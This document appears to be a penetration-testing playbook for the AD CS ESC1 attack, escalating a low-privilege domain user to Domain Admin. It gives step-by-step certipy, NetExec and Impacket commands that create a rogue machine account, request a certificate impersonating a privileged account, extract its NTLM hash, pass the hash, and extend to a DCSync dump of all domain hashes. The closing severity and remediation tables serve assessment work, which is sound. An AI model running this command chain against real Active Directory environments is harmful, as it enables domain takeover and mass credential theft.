# AD CS ESC1 — Low-Priv User to Domain Admin

**Techniques:** ESC1, Certificate Impersonation, Pass-the-Hash  
**MITRE:** T1087.002, T1649, T1550.002  
**Auth Required:** Low-privilege domain credentials  
**Tags:** #playbook #adcs #esc1 #privesc #domainadmin

---

## Objective
Escalate from low-privilege domain user to Domain Administrator by exploiting a misconfigured AD CS certificate template that allows arbitrary Subject Alternative Name (SAN) specification.

## Prerequisites
- Network access to DC (port 88, 389/636) and CA server (port 135/445)
- Low-privilege domain credentials
- AD CS present with at least one ESC1-vulnerable template
- certipy-ad, NetExec, Impacket installed

---

## Steps

### Step 1 — DC Discovery (unauthenticated)
```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain> | grep ldap | cut -d' ' -f 6 | sed 's/\.$//' | while read -r host; do ping $host -c1; done | grep PING
```
Identifies all DC hostnames and IPs. No credentials required.

### Step 2 — Enumerate Vulnerable Templates
```bash
certipy find -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -vulnerable -stdout
```
Look for ESC1 flag. Note:
- `CA Name` → `-ca` value
- `DNS Name` → `-target` value (CA server, not DC)
- `Enrollment Rights` → determines if machine account needed

### Step 3 — Add Machine Account (if Domain Computers enrollment required)
```bash
addcomputer.py '[domain]/[user]:[password]' -dc-ip [dc-ip] -method LDAPS \
  -computer-name EVILPC -computer-pass 'P@ssw0rd123!'
```
Skip this step if `Domain Users` have enrollment rights — use your existing account instead.

### Step 4 — Identify High-Value Target
```bash
# Find accounts with elevated privileges
nxc ldap [dc-ip] -u '[user]' -p '[password]' --admin-count
nxc ldap [dc-ip] -u '[user]' -p '[password]' --groups "Domain Admins"

# Get UPN + SID for chosen target
nxc ldap [dc-ip] -u '[user]' -p '[password]' \
  --query "(sAMAccountName=[target])" "sAMAccountName objectSid userPrincipalName"
```

### Step 5 — Request Certificate Impersonating Target
```bash
certipy req \
  -u 'EVILPC$' -p 'P@ssw0rd123!' \
  -dc-ip [dc-ip] \
  -target [ca-dns-name] \
  -ca [ca-name] \
  -template [vulnerable-template] \
  -upn [target@domain] \
  -sid [target-SID]
```
Output: `[target].pfx`

### Step 6 — Authenticate with Certificate
```bash
certipy auth -pfx [target].pfx -dc-ip [dc-ip]
```
Output: TGT (.ccache) + NTLM hash

### Step 7 — Validate Domain Admin Access
```bash
nxc smb [dc-ip] -u '[target]' -H '[ntlm-hash]'
```
Look for `(Pwn3d!)` — confirms DA-level access.

---

## Full One-Liner (Steps 5–7 after prereqs)
```bash
certipy req -u 'EVILPC$' -p '[pass]' -dc-ip [dc-ip] -target [ca-host] -ca [ca-name] -template [template] -upn [target@domain] -sid [SID] && certipy auth -pfx [target].pfx -dc-ip [dc-ip]
```

---

## Expected Output
```
[*] Successfully requested certificate
[*] Got certificate with UPN 'svc_scanner@corp.local'
[*] Saved certificate to 'svc_scanner.pfx'
[*] Got hash for 'svc_scanner@corp.local': aad3b435b51404eeaad3b435b51404ee:[hash]
SMB  10.0.0.10  445  DC01  [+] corp.local\svc_scanner:[hash] (Pwn3d!)
```

---

## Evidence to Capture
- [ ] certipy find output showing ESC1 flag + enrollment rights
- [ ] certipy req output showing cert issued with target UPN
- [ ] certipy auth output showing NTLM hash retrieved
- [ ] nxc smb output showing `(Pwn3d!)`

---

## Severity Assessment
| Condition | Severity |
|-----------|----------|
| ESC1 present, Domain Users can enroll | Critical |
| ESC1 present, Domain Computers can enroll (MAQ > 0) | Critical |
| ESC1 present, restricted group enrollment only | High |

---

## Relay / Attack Path
- Extend: `secretsdump.py '[domain]/[target]@[dc-ip]' -hashes ':[hash]' -just-dc-ntlm` → DCSync → full NTDS dump

---

## Remediation
| Finding | Fix |
|---------|-----|
| ESC1 — arbitrary SAN | Restrict enrollment rights; enable manager approval; remove unused templates |
| Over-privileged svc accounts | Audit AdminCount=1 accounts; enforce least privilege |
| Machine Account Quota > 0 | Reduce MAQ to 0 if machine account creation by users is not needed |

---

## Related
- [[ttps/credential-access/adcs-esc1-san-impersonation]]
- [[ttps/credential-access/adcs-cert-auth]]
- [[ttps/recon/ad-user-enumeration]]
- [[ttps/recon/dc-discovery-dns]]
- [[tools/certipy]]
- [[tools/addcomputer]]
- [[tools/nxc]]
